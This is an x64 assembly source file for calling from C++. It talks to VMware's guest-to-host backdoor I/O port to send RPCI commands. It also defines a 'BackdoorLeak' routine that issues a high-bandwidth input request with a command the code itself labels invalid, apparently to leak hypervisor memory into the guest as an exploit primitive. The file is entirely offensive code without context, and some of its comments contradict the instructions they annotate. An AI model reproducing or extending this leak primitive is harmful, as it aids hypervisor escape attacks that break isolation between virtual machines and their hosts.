.CODE

; put these in your CPP file
; extern "C" BOOL BackdoorLeak(char* buffer, size_t size);
; extern "C" BOOL SendRPCRequest(char* in_buffer, size_t size);

SendRPCRequest PROC
    ; Preserve registers
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    
    ; store variables
    mov r12, rcx		; address of input buffer
    mov r13, rdx		; size of input buffer

    ; open the RPC channel
    ; -----------------------------------------------------------------------
    mov rax, 0564D5868h		; Magic number 'VMXh'
    mov rcx, 0001eh		; MESSAGE_TYPE_OPEN
    mov rdx, 05658h		; Low bandwidth
    mov rbx, 0C9435052h		; Magic number 'RPCI'
    in eax, dx			; Make the request

    				; save the RPC channel no.
    mov r15, rdx		; rdx contains the channel
				; number in edx (hi)

    ; send the size of the cmd
    ; -----------------------------------------------------------------------
    mov rax, 0564D5868h		; Magic number 'VMXh'
    mov rcx, 01001eh		; MESSAGE_TYPE_SENDSIZE
    mov dx, 05658h		; Low bandwidth
				; edx(hi) contains the channel
				; number

    mov rbx, r13		; The size of the request
    in eax, dx			; Make the request
        			; esi and edi contain the 	
                		; cookies

    ; send the cmd
    ; -----------------------------------------------------------------------
    mov rax, 0564D5868h		; Magic number 'VMXh'
    mov rcx, r13    		; The size of the request
    mov dx, 05659h		; Switch to high bandwidth
				; edx(hi) contains the channel
				; number
    mov rbx, 010000h		; Magic number
    mov rbp, rsi		; Move cookie in to ebp
				; edi and ebp now contain the
                                ; cookies
    mov rsi, r12        	; Pointer to the command 	
                        	; buffer
                                                 
    cld				; Clear the direction flag
    rep outsb			; Repeat string operation is used                                             

    ; receive the reply lengthy
    ; -----------------------------------------------------------------------
    mov rax, 0564D5868h		; Magic number 'VMXh'
    mov rcx, 03001eh 		; MESSAGE_TYPE_RECVSIZE
    mov dx, 05658h		; Low bandwidth
    mov rsi, rbp		; Move cookie back in to esi
                                ; edi and esi now contain the
                                ; cookies
    in eax, dx			; make the request
				; ebx should contain the reply length

    ; close the RPC channel
    ; -----------------------------------------------------------------------
    mov rax, 0564D5868h		; Magic number 'VMXh'
    mov rcx, 06001eh 		; MESSAGE_TYPE_CLOSE
    mov rdx, r15                ; move channel number back in
    mov dx, 05658h		; low bandwidth
    in eax, dx			; make the request

    mov rax, 01h		; return true

    ; restore the stack
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret
SendRPCRequest ENDP

BackdoorLeak PROC
    ; Save callee-saved registers
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15

    ; Allocate shadow space (probably not needed)
    sub rsp, 020h		; Ensure stack alignment and reserve shadow space

    ; Move parameters to the correct registers for VMware
    mov rdi, rcx		; Move buffer address into rdi
    mov rcx, rdx		; Move buffer size into r14

    ; Make the high-bandwidth backdoor request
    ; -----------------------------------------------------------------------
    mov rax, 0564D5868h		; Magic number 'VMXh'
    mov rdx, 05659h             ; High bandwidth request
    mov rbx, 000002h            ; Magic number (INVALID request/command)

    cld                         ; Clear direction flag
    rep insb                    ; Perform input string operation

    mov rax, 01h

    ; Restore the stack
    add rsp, 020h               ; Deallocate shadow space (probably not needed)
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret
BackdoorLeak ENDP

END
